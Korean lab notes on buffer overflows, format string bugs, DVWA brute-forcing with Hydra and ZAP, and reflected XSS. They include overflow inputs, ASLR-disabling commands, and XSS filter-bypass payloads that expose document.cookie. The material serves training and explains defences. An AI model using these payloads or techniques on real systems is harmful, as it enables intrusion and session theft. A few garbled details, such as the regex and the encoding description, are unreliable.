## 126. 버퍼 오버플로우(BOF)

### 1. 버퍼 오버플로우(BOF) 개요

#### 1-1. 버퍼(Buffer)란

버퍼는 메모리의 일종으로, 임시로 데이터를 저장하는 공간이다. 시스템 내부의 CPU, 메모리, 디스크 등 각 장치의 처리 속도가 서로 다르기 때문에, 이를 조율하는 완충 장치 역할을한다.

#### 1-2. 오버플로우(Overflow)란

버퍼에 저장할 수 있는 공간을 초과하여 데이터가 흘러 넘치는 현상이다. 오버플로우가 발생하면 새로운 셸 코드가 실행되거나, 원래 실행되어야 할 프로그램이 정상적으로 실행되지 않는 결과가 나타날 수 있다.

#### 1-3. 스택 버퍼 오버플로우 vs 힙 버퍼 오버플로우


| 구분 | 발생 메모리 영역 | 주소 방향 |
|---|---|---|
| 스택 버퍼 오버플로우 | 스택(Stack) 영역 | 높은 주소 → 낮은 주소 |
| 힙 버퍼 오버플로우 | 힙(Heap) 영역 | 낮은 주소 → 높은 주소 |

#### 1-4. 메모리 구조 (높은 주소 → 낮은 주소)

스택 영역에는 지역 변수·매개변수가 저장되며, 그 아래로 힙 영역(동적 할당), 데이터 영역, 코드 영역 순으로 배치된다.

### 2. 메모리 보호 기법

현재 리눅스에는 다양한 메모리 보호 기법이 기본적으로 동작하고 있다.


| 기법 | 설명 |
|---|---|
| ASLR (Address Space Layout<br>Randomization) | 프로그램 실행 시 스택·힙 등의 메모리 주소를 매<br>번 랜덤하게 변경한다. 공격자가 셸 코드를 삽입할<br>정확한 주소를 알 수 없게 만든다. |
| 스택 카나리 (Stack Canary) | 메모리 주소에 특정 비밀값(카나리값)을 미리 생<br>성해 놓는다. 오버플로우 발생 시 카나리값이 변조 |


| 기법 | 설명 |
|---|---|
|  | 되었는지 검증하며, 변조가 확인되면 이후 프로그<br>램 실행을 중단한다. |
| NX Bit (Non-Executable Bit) | 메모리의 특정 영역에서 읽기·쓰기만 허용하고, 실<br>행은 불가능하도록 설정한다. |
| PIE (Position Independent Executable) | 프로그램 코드를 포함한 메모리 영역 전체의 주소<br>를 무작위로 배치하는 컴파일 기법이다. ASLR과<br>유사하게 함께 사용된다. |

### 3. 취약한 C 함수

#### 3-1. strcpy vs strncpy


| 함수 | 특징 | BOF 취약 여부 |
|---|---|---|
| strcpy(dest, src) | 입력 데이터 길이를 검증하지 않<br>고 복사한다. | 취약 |
| strncpy(dest, src, n) | 복사할 문자열 개수(n)를 지정하<br>여 검증한다. | 방어 가능 |

⚠️ 개발자 입장에서 입력값 검증 없이 strcpy 를 사용하면 BOF 취약점이 발생할 수 있다. strncpy 를 사용하여 입력 길이를 반드시 검증해야 한다.

### 4. 세그멘테이션 폴트 확인

#### 4-1. 소스 코드 작성

// bof_vln.c — strcpy를 사용하는 BOF 취약 프로그램 // 버퍼 크기: 16바이트 vi 로 파일을 생성한다.

sudo vi bof_vln.c 프로그램 구조 요약:

char buffer[16]  : 16바이트 버퍼 선언 strcpy(buffer, str)  : 입력 길이 검증 없이 버퍼에 복사 printf("문자열: %s", buffer)  : 버퍼 내용 출력

#### 4-2. 컴파일 (메모리 보호 기법 우회 옵션 적용)

# 카나리 삽입 비활성화 / NX Bit 해제 / PIE 비활성화 옵션으로 컴파일 sudo gcc -fno-stack-protector -z execstack -no-pie -o bof-vuln bof_vln.c


| 옵션 | 역할 |
|---|---|
| -fno-stack-protector | 스택 카나리 삽입 비활성화 |
| -z execstack | NX Bit 해제 (스택 실행 허용) |
| -no-pie | PIE 비활성화 (무작위 주소 배치 해제) |

#### 4-3. 실행 결과

# 정상 입력 (16바이트 이하) ./bof-vuln hello # → "hello" 출력 # 버퍼 초과 입력 (20바이트) ./bof-vuln AAAAAAAAAAAAAAAAAAAA # → Segmentation fault (core dumped)

버퍼 크기(16바이트)를 초과하는 데이터를 입력하면 세그멘테이션 폴트가 발생하며, 이는 오버플로우가 일어났음을 의미한다.

### 5. 즉시 종료 여부 차이 확인

#### 5-1. 패딩(Padding)과 RET 주소

버퍼 크기를 1바이트 초과해도 프로그램이 즉시 종료되지 않는 경우가 있다. 스택 영역에는 버퍼 외에 **패딩(Padding)**과 SFP(Saved Frame Pointer) 공간이 추가로 존재하기 때문이다.


| 영역 | 설명 |
|---|---|
| 버퍼 (Buffer) | 실제 데이터가 저장되는 공간 |


| 영역 | 설명 |
|---|---|
| 패딩 (Padding) | 메모리 정렬을 위한 여유 공간 |
| SFP | 포인터 레지스터 저장 공간 |
| RET (Return Address) | 함수 실행 후 복귀할 주소 |

프로그램이 비정상 동작하거나 공격자의 셸 코드가 실행되려면 반드시 RET 주소 영역까지 침범해야 한다. 버퍼를 조금 초과했다고 해서 바로 오버플로우가 발생하는 것은 아니다.

#### 5-2. 실행 결과 비교

# 16바이트 이하 입력 → 정상 종료 메시지 출력 ./bof-test hello # 17바이트 입력 → 프로그램 실행은 완료되나 세그멘테이션 폴트 발생 ./bof-test AAAAAAAAAAAAAAAAA # 버퍼를 훨씬 초과하는 입력 → 정상 종료 메시지 미출력, 즉시 세그멘테이션 폴트 ./bof-test AAAAAAAAAAAAAAAAAAAAAAAAAAA...

정상 종료 메시지가 뜨지 않는다는 것은 프로그램이 끝까지 실행되지 않았음을 의미한다. 이는 RET 주소까지 침범되어 프로그램이 중단된 것이다.

### 6. 인증 우회

#### 6-1. 소스 코드 구조

int auth_status = 0  : 인증 상태 변수 (0 = 실패, 1 = 성공)

char password_buffer[16]  : 패스워드 저장 버퍼 (16바이트)

strcpy  사용으로 입력 길이 검증 없음 비밀번호가 secret123 일 때만 인증 성공 출력

#### 6-2. 컴파일

# 카나리 비활성화 옵션으로 컴파일 sudo gcc -fno-stack-protector -o bof-auth bof_auth.c

#### 6-3. 실행 결과

# 정상 입력 ./bof-auth hello # → 인증 실패 ./bof-auth secret123 # → 인증 성공 (관리자 권한 획득)

# 버퍼를 훨씬 초과하는 임의 데이터 입력 ./bof-auth AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... # → 인증 성공 (인증 우회 발생)

⚠️ 버퍼 오버플로우로 인해 auth_status  변수 값이 변조되어, secret123  없이도 인증이 성공하는 취약점이 발생한다. 이는 BOF를 통한 인증 우회 사례이다.

### 7. 시스템 함수 명령어 변조

#### 7-1. 소스 코드 구조

char command[16]  : 명령어 저장 버퍼 (16바이트, 초기값: date )

strcpy  사용으로 입력 길이 검증 없음 system(command)  함수로 명령어를 실행하여 결과 출력

#### 7-2. 컴파일 및 실행

# 컴파일 sudo gcc -fno-stack-protector -z execstack -no-pie -o bof_system bof_system.c # 정상 입력 (16바이트 이하) ./bof_system test # → 입력 데이터: test / 실행 명령어: date / 현재 시간 출력 # 16바이트 이후 명령어 삽입 예시 ./bof_system AAAAAAAAAAAAAAAA whoami # → 버퍼 16바이트를 채운 후 나머지 부분이 명령어로 인식되어 whoami 실행 ./bof_system AAAAAAAAAAAAAAAA ls # → ls 명령어가 실행됨 16바이트 이내 데이터는 사용자 입력으로, 16바이트를 초과하는 부분은 실행할 명령어로 인식된다. 버퍼를 훨씬 초과하는 입력을 주면 세그멘테이션 폴트가 발생하여 프로그램이 비정상 종료된다.

### 8. ASLR 설정 확인 및 변경

#### 8-1. ASLR 현재 값 확인

# sysctl 명령으로 확인 sysctl kernel.randomize_va_space # 또는 파일 경로에서 직접 확인 cat /proc/sys/kernel/randomize_va_space

#### 8-2. ASLR 값 의미


| 값 | 의미 |
|---|---|
| 1 | ASLR 활성화 (기본값) |
| 0 | ASLR 비활성화 |

#### 8-3. 일시적 변경 (재부팅 시 초기화)

# ASLR 비활성화 sudo sysctl -w kernel.randomize_va_space=0 # ASLR 재활성화 sudo sysctl -w kernel.randomize_va_space=1

#### 8-4. 영구 변경 (재부팅 후에도 유지)

# 파일에 직접 0을 기록하면 재부팅 후에도 ASLR이 비활성화 상태로 유지된다 echo 0 > /proc/sys/kernel/randomize_va_space ⚠️ 우분투 리눅스를 재부팅하면 ASLR 값이 원래대로(1) 되돌아온다. 영구 변경 후에는 반드시 필요에 따라 다시 활성화해야 한다.

## 127. 포맷 스트링 취약점 개념

### 1. 포맷 스트링(Format String) 취약점 개요

#### 1-1. 정의

printf , printf , sprintf  등 포맷팅 함수를 잘못 사용하였을 때 발생하는 취약점이다. 출력 포맷이 지정되지 않은 상태에서 사용자 입력을 그대로 출력하도록 하면, 공격자가 임의의 포맷 문자열을 삽입하여 메모리 값을 읽거나 변조할 수 있다.

#### 1-2. 취약한 코드 vs 안전한 코드

// 취약한 코드 — 포맷 미지정 printf(user_input);

// 안전한 코드 — 포맷 지정 printf("%s", user_input);

// 정수형 포맷 지정 예시 printf("%s %d", user_input, age);

⚠️ 사용자로부터 입력을 받을 때는 각각의 포맷을 정확하게 지정해야 한다. 포맷이 지정되지 않으면 사용자가 원하는 포맷을 임의로 삽입할 수 있다.

### 2. 포맷 스트링 주요 기호


| 기호 | 분류 | 역할 |
|---|---|---|
| %p | 읽기(Leak) | 스택에 있는 값을 16진수 주소로<br>읽는다. |
| %s | 읽기(Leak) | 스택 메모리 안의 실제 데이터<br>값(문자열)을 읽는다. |
| %n | 쓰기(Write) | 메모리 값을 변조할 수 있다. |

### 3. 포맷 스트링 메모리 읽기

#### 3-1. 소스 코드 구조

char secret_key[]  : 시크릿 패스워드 값 저장 char buffer[100]  : 100바이트 버퍼 strncpy  사용으로 BOF 취약점은 없음 printf(buffer)  : 포맷 미지정으로 포맷 스트링 취약점 존재

#### 3-2. 컴파일

# PIE 비활성화 옵션으로 컴파일 gcc -no-pie -o fs_leak fs_leak.c 컴파일 시 다음과 같은 경고 메시지가 출력된다.

warning: format not a string literal and no format arguments [-Wformat-security]

이 경고는 포맷이 지정되지 않은 위치(17번 라인)를 알려주는 것으로, 에러가 아닌 경고 (Warning)이다. 개발자는 이 경고를 통해 포맷을 지정해야 함을 인지할 수 있다.

#### 3-3. 실행 결과

# 정상 입력 ./fs_leak hello # → hello 출력 # 100바이트 초과 입력 시 → strncpy에 의해 검증되어 세그멘테이션 폴트 없이 정상 종료 # %p를 이용한 메모리 주소 읽기 (10개 입력 시 10개 주소 출력) ./fs_leak "%p%p%p%p%p%p%p%p%p%p" # → 16진수 메모리 주소 10개가 출력됨 # %s를 이용한 실제 데이터 값 읽기 (네 번째 위치) ./fs_leak "%p%p%p%s%p%p..." # → 네 번째 메모리 주소에 해당하는 실제 데이터 값(문자열) 출력 %p 를 여러 개 입력하면 스택에 있는 16진수 메모리 주소들이 순서대로 출력된다. %s 로 변경하면 해당 위치의 실제 데이터 값을 확인할 수 있다.

### 4. 포맷 스트링 메모리 쓰기

#### 4-1. 소스 코드 구조

int target_variable = 0  : 인증 상태 변수 (0 = 실패, 1 = 성공)

char buffer[100]  : 100바이트 버퍼 현재 변수의 주소 값을 출력하도록 되어 있음 printf(buffer)  : 포맷 미지정으로 포맷 스트링 취약점 존재 target_variable 이 0이 아니면 인증 성공, 0이면 변수 값 0 출력

#### 4-2. 컴파일

# BOF 취약점이 없으므로 메모리 보호 기법 우회 옵션 없이 컴파일 gcc -o fs_write fs_write.c 컴파일 시 포맷 관련 경고 메시지가 동일하게 출력된다.

#### 4-3. 실행 결과

# 정상 입력 ./fs_write hello # → 변수 값이 0입니다 출력 # %n 포맷 스트링 입력 ./fs_write "%n" # → 프로그램이 정상 종료되지 않고 즉시 중단됨 %n  포맷 스트링을 입력하면 프로그램이 비정상적으로 동작한다. 이는 포맷 스트링 취약점으로 인해 발생하는 것이다. 변조하고자 하는 값을 %n  뒤에 삽입하여 메모리 값을 변조할 수 있으며, 정확한 위치 파악을 위해서는 gdb , gef  등의 툴이 필요하다.

### 5. 정리


| 취약점 | 원인 | 방어 방법 |
|---|---|---|
| 버퍼 오버플로우 (BOF) | 입력 길이를 검증하지 않는<br>strcpy 등 취약한 함수 사용 | strncpy 등 길이 검증 함수<br>사용 |
| 포맷 스트링 | printf(user input) 등 포맷<br>_<br>을 지정하지 않은 출력 함수 사용 | printf("%s", user input)<br>_<br>등 포맷 명시 |

현재 리눅스 시스템에는 ASLR, 스택 카나리, NX Bit, PIE 등 다양한 메모리 보호 기법이 동작하고 있어, 일반적인 BOF 기법만으로는 공격이 어렵다. 그러나 취약한 함수 사용은 개발 단계에서 반드시 자제해야 한다.

## 136. Brute Force

### 1. Brute Force 개요

#### 1-1. 취약점의 본질

브루트포스는 무작위 대입이라고 한다. 아이디나 패스워드를 파쇄할 때 아이디에 자주 사용하는 아이디 목록 파일, 패스워드에 일반적으로 자주 사용하는 목록 파일을 이용해서 무작위로 대입을 해보는 것이다. 대입을 해서 맞는 것이 있다면 패스워드나 계정정보가 뚫리게 된다.

내가 프로그램이 아니더라도 수동으로 admin1, admin2 등 식으로 계속 입력한다 하더라도 시간은 오래 걸리겠지만 맞는 경우가 있다면 뚫릴 수 있다.

⚠️ 인증이 약하게 설정되어 있는 것에서 오는 취약점이기 때문에 웹 애플리케이션뿐만 아니라 인증을 해야 되는 모든 시스템에서 브루트포스에 대한 취약점이 존재할 수 있다.

#### 1-2. DVWA 동작 확인

브루트포스 메뉴를 클릭하면, 사용자가 입력한 값이 URL 주소줄의 파라미터에 어떻게 대입 되는지 보여진다. admin이라는 값은 username 파라미터에, 입력한 숫자는 password 파라미터에 들어간다.

### 2. Low Level 소스 분석

#### 2-1. 코드 동작 방식

Low Level 소스 코드를 보면, 로그인 시 입력된 username과 password 값을 get 방식의 변수에 담아와서 pass라는 변수, user라는 변수에 각각 담는다. 그런 다음 DB에 쿼리를 하게 되는데, 쿼리문은 users라는 테이블로부터 user라는 칼럼에 있는 정보와 사용자가 입력한 user 변수에 들어있는 값이 같은지, 그리고 저장되어 있는 패스워드 칼럼의 내용과 사용자가 입력한 패스워드가 같은지를 비교한다.

이 두 가지가 모두 같으면 환영 메시지(Welcome to the password protected area)와 이미지를 보여주고, 로그인에 실패하면 "Username and/or password incorrect." 메시지를 출력하도록 되어 있다.

핵심은 사용자가 입력하는 사용자 이름과 패스워드에 대한 검증 절차가 없다는 점이다. 검증 절차라고 하는 것은 입력값이 실제 대소문자를 가리는지, 특수문자를 거르는지와 같은 처리가 하나도 없다는 의미이다.

### 3. Hydra를 이용한 공격

#### 3-1. 사전 준비

패스워드 목록 파일을 직접 작성하여 활용한다.

vi password.txt pass 12345678 qwer password qwerty spring ⚠️ 목록 파일에는 실제 패스워드를 포함시켜야 크래킹 테스트 시 정상적으로 찾아낼 수 있다.

#### 3-2. 판단 기준

무작위 대입 시 어떤 값이 정답인지 판단하는 기준은 로그인 실패 시 출력되는 메시지의 존재 여부이다. 만약 대입한 값에서 해당 실패 메시지가 뜨지 않는다면 정상적인 계정 정보라 고 판단할 수 있다.

실패 메시지 예시: Username and/or password incorrect.

#### 3-3. Hydra 명령어 구성

명령어는 다음 순서로 구성한다.


| 구성 요소 | 의미 |
|---|---|
| -l 또는 -L | 계정 정보를 알고 있을 때는 소문자 l로 ID를 직접 지정하고, 모를 때는 대문자 L로<br>ID 목록 파일을 지정한다 |
| -p 또는 -P | 패스워드를 알고 있을 때는 소문자 p로 직접 지정하고, 모를 때는 대문자 P로 목<br>록 파일을 지정한다 |


| 구성 요소 | 의미 |
|---|---|
| 대상 IP 및 경로 | 공격 대상의 IP와 DVWA 경로(192.168.X.X/dvwa/...)를 지정한다 |
| 메소드 | GET 방식인지 POST 방식인지 지정한다 |
| 파라미터 값 | 사이트 뒤에 붙는 실제 요청 값(username, password, Login 등)을 지정하며,<br>패스워드처럼 대입해야 하는 값의 자리를 표시해 둔다 |
| 헤더(H=) | 헤더 부분에 있는 쿠키 값을 지정한다. 쿠키가 두 개 이상이면 콜론이 아니라 세미<br>콜론(;)으로 구분한다 |
| 실패 메시지(F=) | 로그인 실패 시 출력되는 메시지를 지정하며, 점(.)까지 모두 포함해서 지정한다.<br>이 메시지가 나오지 않는 경우를 정답으로 판단한다 |

⚠️ 명령어에서 사이트 주소 뒤의 파라미터 구분은 콜론(:)을 사용해야 한다. 물음표(?)로 입력하면 오류가 발생하므로 콜론으로 바꿔주어야 한다.

#### 3-4. 쿠키 값 확인 방법

F12를 눌러 웹브라우저 개발자 도구의 스토리지 메뉴에서 Cookies를 확인하면 쿠키 값을 확인할 수 있다. 더블클릭 후 우클릭으로 복사가 가능하다. DVWA에서는 PHPSESSID와 security 두 개의 쿠키 값이 존재한다.

#### 3-5. 세션(Session)의 의미

세션은 통신 연결의 구축·확립을 나타낸다. 현재 시간대에 웹브라우저가 웹서버에 접속했을 때의 통신 연결에 대한 고유한 값을 나타낸다. 브라우저를 닫았다가 나중에 다시 들어가면 세션 아이디가 달라질 수 있다.

#### 3-6. 명령어 실행 결과

패스워드 목록 파일에 단어가 6개 있었다면 admin 계정으로 총 6번의 로그인 시도를 하고, 그 중에서 실제 패스워드를 넣었을 때 실패 메시지가 나오지 않는 결과(Successful)가 표시된다.

또한 ID도 모를 경우 유저 목록 파일(user.txt)을 별도로 생성하여 -L  옵션으로 지정하면 된다. 만약 ID 목록 6개와 패스워드 목록 6개가 있다면 총 36번의 로그인 시도가 이루어진다.

메소드: GET 방식으로 요청 헤더 부분: Host, User-Agent, Accept, Connection, Cookie 등

### 5. OWASP ZAP을 이용한 공격

#### 5-1. ZAP 설치 및 실행

ZAP(OWASP Zed Attack Proxy, ZAP은 P가 하나)을 칼리 터미널에서 검색하여 설치한다. 설치가 완료되면 칼리의 응용 프로그램(어플리케이션)에서 ZAP을 입력하여 실행할 수 있다.

⚠️ ZAP도 프락시 툴이기 때문에 Burp Suite와 동시에 실행하면 동일 포트로 충돌이 발생한다. 둘 중 하나만 종료하고 실행해야 한다.

처음 실행 시 세션에 대한 확인 창이 뜨는데, 첫 번째 옵션을 선택하고 Remember에 체크하면 이후 창이 뜨지 않는다.

#### 5-2. ZAP의 화면 구성

ZAP에는 Add-on(애드온) 목록이 있어 업데이트가 가능하며, 마켓플레이스를 통해 무료/유 료 도구를 추가로 다운로드할 수 있다.

웹브라우저에서 프락시 설정 후 사이트를 왔다 갔다 하면 ZAP에 자동으로 방문 사이트 정보가 기록된다. 사이트에 표시되는 깃발의 색상에 따라 취약점 위험도를 나타낸다.


| 깃발 색상 | 의미 |
|---|---|
| 빨간색 계열 | 위험도가 높은 취약점 |
| 파란색 계열 | 일반적인 취약점 |

#### 5-3. ZAP에서의 Intercept(Break)

ZAP에서 인터셉트와 같은 역할을 하는 것은 도구 모음 우측의 녹색 원이다.


| 상태 | 색상 | 의미 |
|---|---|---|
| Off | 녹색 | 인터셉트가 꺼져있는 상태 |
| On | 빨간색 | 서버로 넘어가기 전 트래픽을 잡는 상태(Break) |

Break를 ON으로 설정한 후 로그인을 시도하면 Break 탭이 새로 생기며 서버로 넘어가는 내용을 확인할 수 있다.

#### 5-4. ZAP의 Fuzz 기능

우클릭하여 활성화되는 도구들 중 Fuzz가 있다. 퍼징하고 싶은 부분(예: 패스워드 값)을 블 록으로 잡고 우클릭하여 Fuzz를 적용하면 해당 부분이 빨갛게 표시된다. Add를 통해 String 또는 Number Zero Padded String 등의 형식으로 단어들을 추가하고 Save한 후 퍼징을 진행하면 일치하는 단어를 출력해준다.

#### 5-5. Active Scan 기능

최상위 사이트에서 우클릭 → Attack → Active Scan을 실행하면 기본 정책을 가지고 스캐닝을 시작한다. Advanced Option을 통해 추가적인 스캐닝 옵션을 설정할 수 있으며, 기본 값으로도 스캐닝이 가능하다.

스캐닝이 완료되면 Alerts 탭(빨간 깃발)에서 발견된 취약점 목록을 확인할 수 있다. 각 취약점을 선택하면 다음 정보가 상세하게 표시된다.

취약점이 있는 URL 주소 위험도(Risk)

영향받는 파라미터 공격 방법 및 대응 방안 ⚠️ Burp Suite와 ZAP은 모두 프락시 역할을 한다는 점에서 동일하지만, 부가적인 기능 사용에 있어 차이가 있다. 두 개를 번갈아가며 사용해보면서 어떤 작업에 어떤 도구가 더 편한지 감을 잡을 수 있다.

⚠️ ZAP을 닫을 경우 웹브라우저의 프락시 설정을 '프락시 없음'으로 변경해야 정상적으로 웹페이지가 동작한다.

### 6. 보안 레벨별 차이

#### 6-1. Medium Level

미디엄 레벨에서는 보안 코딩 작업이 추가되었지만, Low Level과 동일한 방법(Hydra, Burp, ZAP 퍼징)을 사용해도 똑같이 패스워드가 크래킹된다.

소스 코드를 확인하면 입력값을 mysql_real_escape_string  함수를 통해 한번 처리해서 넣고 있다. 이는 SQL의 이스케이프 문자에 대한 처리를 해주는 함수이지만, 패스워드나 계정 아이디 자체에 이스케이프 문자가 없다면 아무런 의미가 없다.

#### 6-2. High Level

하이레벨로 변경하여 소스를 확인하면 다음과 같은 차이가 있다.

세션 토큰(Token) 정보를 체크하는 절차 추가 stripslashes  함수를 통해 입력값에 있는 슬래시를 벗겨내는 처리 추가 토큰이라고 하는 것은 1회성 값을 의미한다. 사용자의 세션 아이디 정보를 가져와서 현재 세션 아이디에 맞는 1회성 토큰 정보를 발급하며, 아이디 값과 세션 값, 토큰 값이 맞지 않으면 체크하여 패스워드 크래킹이 이루어지지 않도록 코드를 보완해 놓았다.

⚠️ 단순 브루트 포싱으로는 이 토큰 정보를 확인하기 어려우므로 패스워드 크래킹이 불 가능하지만, CSRF 취약점과 같이 사용하면 추가적으로 토큰 정보를 알아내어 브루트 포 싱을 통해 패스워드를 크래킹할 수 있는 여지가 남아있다.

#### 6-3. Impossible Level

소스를 확인하면 토큰 정보와 세션 정보를 비교하는 것, 각 입력값에 두 개의 함수로 처리하는 것 외에 추가적인 보완이 들어가 있다.

로그인 실패 전체 횟수: 3 세 번 로그인에 실패하면 락아웃(잠김) 처리가 되며, 일정 시간(15분)이 지나야 다시 시도할 수 있다. 이러한 방식 때문에 브루트 포싱이 상당히 힘들어진다.

⚠️ Impossible 레벨에서도 단일 취약점만으로는 뚫을 수 없지만, 다른 취약점들과 함께 사용하면 뚫릴 수 있는 여지가 존재한다.

## 137. Captcha 개요 및 XSS Reflected

### 1. Captcha(캡차) 개요

#### 1-1. 캡차의 일반적 정의

캡차는 아이디, 패스워드를 입력하는 것 외에 추가로 어떤 문자열을 입력하게 하거나, 그림 을 보여주면서 특정 사물(예: 자전거 그림)을 선택하게 하는 등의 절차를 말한다. 보통 2차 인증을 통해 사용하는 것이 캡차이다.

⚠️ DVWA에서 캡차를 실제로 사용하려면 구글 API 키를 받아와서 로그인하고 등록하는 과정이 필요하다. 이번 실습에서는 진행하지 않는다.

#### 1-2. Low Level 소스 분석

소스에서는 POST 방식으로 숨겨져 있는 캡차에 대한 값을 가져오도록 되어 있다. 새로운 패스워드(password_new)와 패스워드 확인(password_conf) 두 값을 동일하게 입력하면된다.

캡차에 실패했을 경우에는 "The Capture was incorrect" 라는 메시지를 보여주고, 캡차 인증을 체크해서 성공하고 새로운 패스워드와 두 번째 패스워드가 동일하다면 패스워드 변경(Password Changed) 메시지를 출력하며, 그렇지 않으면 "Did not match" 메시지를 출력하도록 되어 있다.

### 2. XSS(Cross Site Scripting) 개요

#### 2-1. XSS의 정의

XSS는 크로스 사이트 스크립팅(Cross Site Scripting)의 약자이다. 스크립트를 삽입해서 공격할 수 있는 취약점을 나타낸다.

#### 2-2. Reflected와 Stored의 구분


| 구분 | 한글 표현 | 특징 |
|---|---|---|
| Reflected | 반사형 | 한 번 입력하고 실행되며, 저장<br>되지 않고 1회성에 그침 |


| 구분 | 한글 표현 | 특징 |
|---|---|---|
| Stored | 저장형 | 스크립트 코드가 저장되어, 다음<br>에 해당 페이지를 방문할 때 자<br>동으로 실행됨 |

대부분 반사형은 검색이나 입력 폼과 같은 형태가 될 것이고, 저장형은 게시판 형태가 대부 분이다. 게시판의 경우 사용자가 어떤 글을 입력하거나 올리면 저장이 되고, 작성한 글이 있는 페이지로 들어가면 자동으로 스크립트가 실행된다면 저장형(Stored) XSS 취약점이 있다고 알 수 있다.

### 3. Low Level — XSS Reflected

#### 3-1. 동작 방식 확인

URL의 파라미터에 임의의 문자열(예: ABC)을 넣어보면 "Hello" 뒤에 사용자의 입력값이 그대로 출력되는 것을 확인할 수 있다. URL에서 name이라고 하는 파라미터에 사용자가 입력한 값이 들어가고 있는 것을 확인할 수 있다.

#### 3-2. 스크립트 태그 삽입

<script>alert('해킹')</script> 스크립트 태그는 <script> 로 시작해서 </script> 로 닫아준다. alert는 경고창(팝업창)을 띄 우는 스크립트이며, 그 안에 들어갈 문자열은 따옴표 안에 지정할 수 있다.

만약 이 스크립트가 먹힌다면 XSS 취약점이 있다는 것이 된다.

#### 3-3. 쿠키 값 탈취 예시

<script>alert(document.cookie)</script> document.cookie 를 사용하면 HTML 전체 문서에서 쿠키 값을 가져와 경고창으로 보여줄 수 있다. 일반 문자열을 출력할 때는 따옴표를 사용하지만, 명령어를 실행해서 가져오고 싶다면 문자열이 아니므로 따옴표 없이 지정한다.

#### 3-4. 반사형(1회성) 검증

다른 페이지(예: 브루트포스)에 들어갔다가 다시 XSS Reflected 페이지로 들어오면 이전에 실행했던 스크립트가 더 이상 실행되지 않는다. 이는 입력했던 스크립트가 저장되지 않고 1회성(반사형)이라는 것을 확인할 수 있는 부분이다.

#### 3-5. Low Level 소스 분석

소스를 보면 name이라는 파라미터를 받아와서 "Hello"라는 문자열 뒤에 점(.)으로 연결하여 출력하는 것뿐이다. PHP에서 점(.)의 역할은 문자열 더하기이다.

검증하는 작업이 하나도 없으므로 name 파라미터에 스크립트 태그를 넣으면 그대로 실행되는 취약점이 발생한다.

### 4. Medium Level — XSS Reflected

#### 4-1. 보완된 코드

Low Level과 동일한 스크립트 태그를 입력하면 <script> 와 </script> 가 사라지고 "Hello" 뒤에 일반 문자열로만 출력된다. 소스를 확인하면 str_replace라는 문자열 대체 변환 함수를 통해 <script> , </script>  태그를 공백으로 바꿔주도록 되어 있다.

#### 4-2. 우회 방법 1 — 대소문자 혼용

HTTP 프로토콜 인식 방식과 마찬가지로, 웹브라우저는 스크립트 태그를 대소문자 구분 없이 인식한다. 소문자에 대해서만 공백 처리를 했기 때문에 대소문자를 섞으면 우회할 수 있다.

<sCript>alert('해킹')</scrIpt>

#### 4-3. 우회 방법 2 — 다른 태그를 이용한 회피

스크립트 태그가 아닌 다른 방식으로도 스크립트를 실행하는 우회법이 존재한다. (자세한 내용은 High Level에서 다룬다.)

### 5. High Level — XSS Reflected

#### 5-1. 대소문자 우회 차단 확인

대소문자를 섞어서 시도하면 일부분만 출력이 문자열로 인지되어 출력되고, 나머지는 공백 처리된다. 즉 앞부분까지는 모두 공백 처리되어 스크립트 실행이 되지 않는 것을 확인할 수 있다.

#### 5-2. 소스 분석

소스에서 핵심이 되는 함수는 슬래시, 태그, 그리고 's.\*c.\*r.\*i.\p.\t' 형태로 점(.)과 별표 (\)를 사용하여 작성되어 있다. 점 별표(.\)의 의미는 대소문자를 가리지 않는다는 것이다. 즉 s, c, r, i, p, t 글자가 그 사이에 다른 문자가 무엇이 들어가든 순서대로 나오면 모두 공백으로 처리하도록 되어 있다.

⚠️ 슬래시가 들어오거나, "script"라는 문자열이 들어오면 다 공백 처리가 되기 때문에, 남아 있는 것은 거의 없어 일반적인 방법으로는 스크립트를 실행할 수 있는 문자열을 만들 어내기 어렵다.

#### 5-3. 우회 방법 — img 태그를 이용한 이벤트 핸들러

스크립트 태그가 아니라 이미지(img) 태그를 이용해서 스크립트를 실행하는 방법이 존재한다. img src 는 이미지를 넣을 때 사용하는 HTML 태그이며, 경로 자리에 정상적인 이미지 경로가 아닌 임의의 값(예: x)을 넣으면 해당 경로에 이미지가 없으므로 오류(에러)가 발생한다.

<img src="x" onerror="alert(document.cookie)"> 이미지를 찾지 못해 에러가 발생하면 onerror라는 속성을 통해 에러 발생 시 실행할 메시지 (스크립트)를 지정할 수 있다.

⚠️ 실제 그림은 없으므로 이미지가 깨진 형태(액박)로 표시되지만, 스크립트는 정상적으로 실행되어 경고창과 쿠키 정보가 출력된다. "script"라는 문자열이 없기 때문에 공백 처리 대상에 걸리지 않아 정상적으로 실행되는 조건을 만들어낸 것이다.

### 6. Impossible Level — XSS Reflected

#### 6-1. img src 태그도 차단 확인

스크립트 레벨을 Impossible로 변경하고, 앞서 사용했던 img src 태그를 이용한 스크립트를 입력하면 전체가 태그로 인식되지 않고 일반 문자열처럼 인식되어 그대로 출력된다.

#### 6-2. 소스 분석

소스를 보면 토큰을 확인하는 절차는 동일하게 존재하고, 핵심적인 것은 HTML 스페셜 캐릭 터스(특수문자)라고 하는 함수이다. 이 함수는 특수 문자들을 엠퍼센트(%)로 시작하는 문자열로 변환한다.


| 원본 문자 | 변환 결과 |
|---|---|
| & (엠퍼센트) | AMP |
| < (부등호) | LT |
| > | GT |


| 원본 문자 | 변환 결과 |
|---|---|
| ' (따옴표) | QUOT |

⚠️ 위와 같이 특수 문자들이 모두 다른 문자열로 변환되기 때문에, 태그를 열기 위해 필요한 부등호( < )가 더 이상 원래 문자로 인식되지 않고 일반 텍스트로 출력된다. 태그를 열 려면 부등호가 그대로 인식되어야 하는데, 이것이 변환되므로 태그로 인식 자체가 되지 않는다.

## 138. Command Injection 취약점

### 1. Command Injection 개요

#### 1-1. 인젝션의 의미

인젝션은 삽입이라는 뜻이다. SQL 인젝션은 SQL 삽입 공격, Command 인젝션은 명령어 삽입 공격을 의미한다. 명령어에는 ping, ls, ipconfig, cat, vi, sudo 등 여러 가지가 있다.

#### 1-2. 명령어 인젝션이 가능한 조건

명령어들을 인젝션하기 위해서는 현재 동작되는 웹사이트의 동작에 대한 이해가 필요하다. 사용자가 입력한 IP 주소(예: 127.0.0.1)에 대해 ping을 실행하는 웹사이트의 경우, 기본적으로 4번 ping을 보내고 그 통계 결과 값을 보여준다. 전체 명령어를 조합해보면, ping 명령어에 보낼 횟수(4번)와 사용자가 입력한 IP 주소값이 합쳐져서 실행되는 것이다.

